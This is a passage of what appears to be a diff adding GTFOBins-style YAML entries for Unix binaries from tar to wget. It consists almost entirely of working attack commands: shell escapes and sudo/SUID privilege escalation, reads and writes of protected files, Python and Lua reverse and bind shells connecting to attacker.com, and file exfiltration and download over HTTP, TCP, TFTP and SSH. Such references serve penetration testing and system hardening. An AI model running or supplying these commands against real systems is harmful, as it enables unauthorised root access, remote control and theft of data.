+- description: This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
+code: |
+RHOST=attacker.com
+RUSER=root
+RFILE=/tmp/file_to_send.tar
+LFILE=file_to_send
+tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh
+file-download:
+- description: This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
+code: |
+RHOST=attacker.com
+RUSER=root
+RFILE=/tmp/file_to_get.tar
+tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh
+file-write:
+- description: This only works for GNU tar.
+code: |
+LFILE=file_to_write
+TF=$(mktemp)
+echo DATA > "$TF"
+tar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P
+file-read:
+- description: This only works for GNU tar.
+code: |
+LFILE=file_to_read
+tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
+sudo:
+- code: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+limited-suid:
+- code: ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+---
+functions:
+shell:
+- code: task execute /bin/sh
+sudo:
+- code: sudo task execute /bin/sh
+---
+functions:
+shell:
+- code: taskset 1 /bin/sh
+suid:
+- code: ./taskset 1 /bin/sh -p
+sudo:
+- code: sudo taskset 1 /bin/sh
+---
+functions:
+shell:
+- code: |
+tasksh
+!/bin/sh
+limited-suid:
+- code: |
+./tasksh
+!/bin/sh
+sudo:
+- code: |
+sudo tasksh
+!/bin/sh
+---
+description: |
+The read file content is corrupted by additional text at the beginning.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+tbl $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./tbl $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo tbl $LFILE
+---
+functions:
+shell:
+- code: |
+tclsh
+exec /bin/sh <@stdin >@stdout 2>@stderr
+non-interactive-reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
+suid:
+- code: |
+./tclsh
+exec /bin/sh -p <@stdin >@stdout 2>@stderr
+sudo:
+- code: |
+sudo tclsh
+exec /bin/sh <@stdin >@stdout 2>@stderr
+---
+description: |
+These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.
+
+In recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.
+functions:
+command:
+- code: |
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
+sudo:
+- code: |
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+---
+description: It can only append data if the destination exists.
+functions:
+file-write:
+- code: |
+LFILE=file_to_write
+echo DATA | ./tee -a "$LFILE"
+suid:
+- code: |
+LFILE=file_to_write
+echo DATA | ./tee -a "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_write
+echo DATA | sudo tee -a "$LFILE"
+---
+functions:
+shell:
+- description: BSD version only. Needs to be connected first.
+code: |
+RHOST=attacker.com
+RPORT=12345
+telnet $RHOST $RPORT
+^]
+!/bin/sh
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+RHOST=attacker.com
+RPORT=12345
+TF=$(mktemp -u)
+mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
+sudo:
+- description: BSD version only. Needs to be connected first.
+code: |
+RHOST=attacker.com
+RPORT=12345
+sudo telnet $RHOST $RPORT
+^]
+!/bin/sh
+limited-suid:
+- description: BSD version only. Needs to be connected first.
+code: |
+RHOST=attacker.com
+RPORT=12345
+./telnet $RHOST $RPORT
+^]
+!/bin/sh
+---
+functions:
+shell:
+- code: |
+tex --shell-escape '\write18{/bin/sh}nd'
+sudo:
+- code: |
+sudo tex --shell-escape '\write18{/bin/sh}nd'
+limited-suid:
+- code: |
+./tex --shell-escape '\write18{/bin/sh}nd'
+---
+functions:
+file-upload:
+- description: Send local file to a TFTP server.
+code: |
+RHOST=attacker.com
+tftp $RHOST
+put file_to_send
+file-download:
+- description: Fetch a remote file from a TFTP server.
+code: |
+RHOST=attacker.com
+tftp $RHOST
+get file_to_get
+suid:
+- description: Send local file to a TFTP server.
+code: |
+RHOST=attacker.com
+./tftp $RHOST
+put file_to_send
+sudo:
+- description: Send local file to a TFTP server.
+code: |
+RHOST=attacker.com
+sudo tftp $RHOST
+put file_to_send
+---
+description: The tic command translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure, so this may not be suitable to read arbitrary binary data.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+tic -C "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./tic -C "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo tic -C "$LFILE"
+---
+description: Note that the shell might have its own builtin time implementation, which may behave differently than` /usr/bin/time`, hence the absolute path.
+functions:
+shell:
+- code: /usr/bin/time /bin/sh
+suid:
+- code: ./time /bin/sh -p
+sudo:
+- code: sudo /usr/bin/time /bin/sh
+---
+description: |
+This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+
+This might not work if run by unprivileged users depending on the system configuration.
+functions:
+shell:
+- code: |
+timedatectl list-timezones
+!/bin/sh
+sudo:
+- code: |
+sudo timedatectl list-timezones
+!/bin/sh
+---
+functions:
+shell:
+- code: timeout 7d /bin/sh
+suid:
+- code: ./timeout 7d /bin/sh -p
+sudo:
+- code: sudo timeout --foreground 7d /bin/sh
+---
+functions:
+shell:
+- code: tmate -c /bin/sh
+sudo:
+- code: sudo tmate -c /bin/sh
+limited-suid:
+- code: ./tmate -c /bin/sh
+---
+functions:
+file-read:
+- description: The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.
+code: |
+LFILE=file_to_read
+tmux -f $LFILE
+shell:
+- code: tmux
+sudo:
+- code: sudo tmux
+---
+description: This requires that an existing configuration file is present, to create one run `top` then type `Wq`. Note down the actual configuration file path and use it in the below examples.
+functions:
+shell:
+- code: |
+echo -e 'pipe	x	exec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
+top
+# press return twice
+reset
+sudo:
+- description: This requires that the root configuration file is writable and might be used to persist elevated privileges.
+code: |
+echo -e 'pipe	x	exec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
+sudo top
+# press return twice
+reset
+---
+description: |
+The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+troff $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./troff $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo troff $LFILE
+---
+description: This program is able to execute [`lua`](/gtfobins/less/) code.
+functions:
+shell:
+- code: |
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' >$TF
+tshark -Xlua_script:$TF
+---
+description: The read file content is corrupted by replacing occurrences of `$'_'` to terminal sequences and by converting tabs to spaces.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+ul "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./ul "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo ul "$LFILE"
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+unexpand -t99999999 "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./unexpand -t99999999 "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo unexpand -t99999999 "$LFILE"
+---
+description: The read file content is corrupted by squashing multiple adjacent lines.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+uniq "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./uniq "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo uniq "$LFILE"
+---
+functions:
+shell:
+- code: unshare /bin/sh
+suid:
+- code: ./unshare -r /bin/sh
+sudo:
+- code: sudo unshare /bin/sh
+---
+description: |
+Certain `unzip` versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:
+
+```
+cp /bin/sh .
+chmod +s sh
+zip shell.zip sh
+```
+
+Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).
+functions:
+sudo:
+- code: |
+sudo unzip -K shell.zip
+./sh -p
+suid:
+- code: |
+./unzip -K shell.zip
+./sh -p
+---
+functions:
+sudo:
+- description: Write in `$LFILE` a symlink to `$TF`.
+code: |
+LFILE=/path/to/file_to_write
+TF=$(mktemp)
+echo DATA >$TF
+sudo update-alternatives --force --install "$LFILE" x "$TF" 0
+suid:
+- description: Write in `$LFILE` a symlink to `$TF`.
+code: |
+LFILE=/path/to/file_to_write
+TF=$(mktemp)
+echo DATA >$TF
+./update-alternatives --force --install "$LFILE" x "$TF" 0
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+uuencode "$LFILE" /dev/stdout | uudecode
+suid:
+- code: |
+LFILE=file_to_read
+uuencode "$LFILE" /dev/stdout | uudecode
+sudo:
+- code: |
+LFILE=file_to_read
+sudo uuencode "$LFILE" /dev/stdout | uudecode
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+uuencode "$LFILE" /dev/stdout | uudecode
+suid:
+- code: |
+LFILE=file_to_read
+uuencode "$LFILE" /dev/stdout | uudecode
+sudo:
+- code: |
+LFILE=file_to_read
+sudo uuencode "$LFILE" /dev/stdout | uudecode
+---
+functions:
+shell:
+- code: valgrind /bin/sh
+sudo:
+- code: sudo valgrind /bin/sh
+---
+description: Modern Unix systems run [`vim`](/gtfobins/vim/) binary when `vi` is called.
+functions:
+shell:
+- code: vi -c ':!/bin/sh' /dev/null
+- code: |
+vi
+:set shell=/bin/sh
+:shell
+file-write:
+- code: |
+vi file_to_write
+iDATA
+^[
+w
+file-read:
+- code: vi file_to_read
+sudo:
+- code: sudo vi -c ':!/bin/sh' /dev/null
+---
+functions:
+shell:
+- code: view -c ':!/bin/sh'
+- code: |
+view
+:set shell=/bin/sh
+:shell
+- description: This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.
+code: view -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- description: This requires that `view` is compiled with Lua support.
+code: view -c ':lua os.execute("reset; exec sh")'
+reverse-shell:
+- description: This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+view -c ':py import vim,sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")
+vim.command(":q!")'
+non-interactive-reverse-shell:
+- description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+view -c ':lua local s=require("socket"); local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+while true do
+local r,x=t:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));t:send(b);
+end;
+f:close();t:close();'
+non-interactive-bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export LPORT=12345
+view -c ':lua local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+while true do
+local r,x=c:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));c:send(b);
+end;c:close();f:close();'
+file-upload:
+- description: This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export URL=http://attacker.com/
+export LFILE=file_to_send
+view -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
+vim.command(":q!")'
+- description: This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
+code: |
+export LPORT=8888
+view -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
+vim.command(":q!")'
+- description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_send
+view -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
+local d=f:read("*a")
+io.close(f);
+local s=require("socket");
+local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+t:send(d);
+t:close();'
+file-download:
+- description: This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+view -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e["URL"], e["LFILE"])
+vim.command(":q!")'
+- description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export LPORT=12345
+export LFILE=file_to_save
+view -c ':lua local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+local d,x=c:receive("*a");
+c:close();
+local f=io.open(os.getenv("LFILE"), "wb");
+f:write(d);
+io.close(f);'
+file-write:
+- code: |
+view file_to_write
+iDATA
+^[
+w!
+file-read:
+- code: view file_to_read
+library-load:
+- description: This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.
+code: view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
+suid:
+- description: This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.
+code: ./view -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+sudo:
+- code: sudo view -c ':!/bin/sh'
+- description: This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.
+code: sudo view -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- description: This requires that `view` is compiled with Lua support.
+code: sudo view -c ':lua os.execute("reset; exec sh")'
+capabilities:
+- description: This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.
+code: ./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+limited-suid:
+- description: This requires that `view` is compiled with Lua support.
+code: ./view -c ':lua os.execute("reset; exec sh")'
+---
+description: This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`.
+functions:
+suid:
+- code: ./vigr
+sudo:
+- code: sudo vigr
+---
+functions:
+shell:
+- code: vim -c ':!/bin/sh'
+- code: vim --cmd ':set shell=/bin/sh|:shell'
+- description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
+code: vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- description: This requires that `vim` is compiled with Lua support.
+code: vim -c ':lua os.execute("reset; exec sh")'
+reverse-shell:
+- description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")
+vim.command(":q!")'
+non-interactive-reverse-shell:
+- description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+vim -c ':lua local s=require("socket"); local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+while true do
+local r,x=t:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));t:send(b);
+end;
+f:close();t:close();'
+non-interactive-bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export LPORT=12345
+vim -c ':lua local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+while true do
+local r,x=c:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));c:send(b);
+end;c:close();f:close();'
+file-upload:
+- description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export URL=http://attacker.com/
+export LFILE=file_to_send
+vim -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
+vim.command(":q!")'
+- description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
+code: |
+export LPORT=8888
+vim -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
+vim.command(":q!")'
+- description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_send
+vim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
+local d=f:read("*a")
+io.close(f);
+local s=require("socket");
+local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+t:send(d);
+t:close();'
+file-download:
+- description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+vim -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e["URL"], e["LFILE"])
+vim.command(":q!")'
+- description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export LPORT=12345
+export LFILE=file_to_save
+vim -c ':lua local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+local d,x=c:receive("*a");
+c:close();
+local f=io.open(os.getenv("LFILE"), "wb");
+f:write(d);
+io.close(f);'
+file-write:
+- code: |
+vim file_to_write
+iDATA
+^[
+w
+file-read:
+- code: vim file_to_read
+library-load:
+- description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
+code: vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
+suid:
+- description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
+code: ./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+sudo:
+- code: sudo vim -c ':!/bin/sh'
+- description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
+code: sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- description: This requires that `vim` is compiled with Lua support.
+code: sudo vim -c ':lua os.execute("reset; exec sh")'
+capabilities:
+- description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
+code: ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+limited-suid:
+- description: This requires that `vim` is compiled with Lua support.
+code: ./vim -c ':lua os.execute("reset; exec sh")'
+---
+functions:
+shell:
+- code: vimdiff -c ':!/bin/sh'
+- code: |
+vimdiff
+:set shell=/bin/sh
+:shell
+- description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
+code: vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- description: This requires that `vimdiff` is compiled with Lua support.
+code: vimdiff -c ':lua os.execute("reset; exec sh")'
+reverse-shell:
+- description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")
+vim.command(":q!")'
+non-interactive-reverse-shell:
+- description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+vimdiff -c ':lua local s=require("socket"); local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+while true do
+local r,x=t:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));t:send(b);
+end;
+f:close();t:close();'
+non-interactive-bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export LPORT=12345
+vimdiff -c ':lua local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+while true do
+local r,x=c:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));c:send(b);
+end;c:close();f:close();'
+file-upload:
+- description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export URL=http://attacker.com/
+export LFILE=file_to_send
+vimdiff -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
+vim.command(":q!")'
+- description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
+code: |
+export LPORT=8888
+vimdiff -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
+vim.command(":q!")'
+- description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_send
+vimdiff -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
+local d=f:read("*a")
+io.close(f);
+local s=require("socket");
+local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+t:send(d);
+t:close();'
+file-download:
+- description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+vimdiff -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e["URL"], e["LFILE"])
+vim.command(":q!")'
+- description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export LPORT=12345
+export LFILE=file_to_save
+vimdiff -c ':lua local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+local d,x=c:receive("*a");
+c:close();
+local f=io.open(os.getenv("LFILE"), "wb");
+f:write(d);
+io.close(f);'
+file-write:
+- code: |
+vimdiff file_to_write
+iDATA
+^[
+w
+file-read:
+- code: vimdiff file_to_read
+library-load:
+- description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
+code: vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
+suid:
+- description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
+code: ./vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+sudo:
+- code: sudo vimdiff -c ':!/bin/sh'
+- description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
+code: sudo vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- description: This requires that `vimdiff` is compiled with Lua support.
+code: sudo vimdiff -c ':lua os.execute("reset; exec sh")'
+capabilities:
+- description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
+code: ./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+limited-suid:
+- description: This requires that `vimdiff` is compiled with Lua support.
+code: ./vimdiff -c ':lua os.execute("reset; exec sh")'
+---
+description: This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`.
+functions:
+suid:
+- code: ./vipw
+sudo:
+- code: sudo vipw
+---
+functions:
+sudo:
+- code: |
+SCRIPT=script_to_run
+TF=$(mktemp)
+cat > $TF << EOF
+<domain type='kvm'>
+<name>x</name>
+<os>
+<type arch='x86_64'>hvm</type>
+</os>
+<memory unit='KiB'>1</memory>
+<devices>
+<interface type='ethernet'>
+<script path='$SCRIPT'/>
+</interface>
+</devices>
+</domain>
+EOF
+sudo virsh -c qemu:///system create $TF
+virsh -c qemu:///system destroy x
+file-write:
+- description: This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.
+code: |
+LFILE_DIR=/root
+LFILE_NAME=file_to_write
+
+echo 'data' > data_to_write
+
+TF=$(mktemp)
+cat > $TF <<EOF
+<volume type='file'>
+<name>y</name>
+<key>$LFILE_DIR/$LFILE_NAME</key>
+<source>
+</source>
+<capacity unit='bytes'>5</capacity>
+<allocation unit='bytes'>4096</allocation>
+<physical unit='bytes'>5</physical>
+<target>
+<path>$LFILE_DIR/$LFILE_NAME</path>
+<format type='raw'/>
+<permissions>
+<mode>0600</mode>
+<owner>0</owner>
+<group>0</group>
+</permissions>
+</target>
+</volume>
+EOF
+
+virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
+virsh -c qemu:///system vol-create --pool x --file $TF
+virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write
+virsh -c qemu:///system pool-destroy x
+file-read:
+- description: This requires the user to be in the `libvirt` group to perform privileged file read.
+code: |
+LFILE_DIR=/root
+LFILE_NAME=file_to_read
+
+SPATH=file_to_save
+
+virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
+virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH
+virsh -c qemu:///system pool-destroy x
+---
+description: This command requires some valid coredump file which, if not available, can be uploaded to the target. The `volshell` command spawns a [`python`](/gtfobins/python/) shell, other functions may apply.
+functions:
+shell:
+- code: |
+volatility -f file.dump volshell
+__import__('os').system('/bin/sh')
+---
+description: The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).
+functions:
+sudo:
+- code: |
+LFILE=file_to_read
+sudo wall --nobanner "$LFILE"
+---
+functions:
+shell:
+- code: watch -x sh -c 'reset; exec sh 1>&0 2>&0'
+suid:
+- description: This keeps the SUID privileges only if the `-x` option is present.
+code: ./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
+sudo:
+- code: sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
+limited-suid:
+- code: ./watch 'reset; exec sh 1>&0 2>&0'
+---
+description: The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message, so this may not be suitable to read binary files.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+wc --files0-from "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./wc --files0-from "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo wc --files0-from "$LFILE"
+---
+functions:
+file-upload:
+- description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.
+code: |
+URL=http://attacker.com/
+LFILE=file_to_send
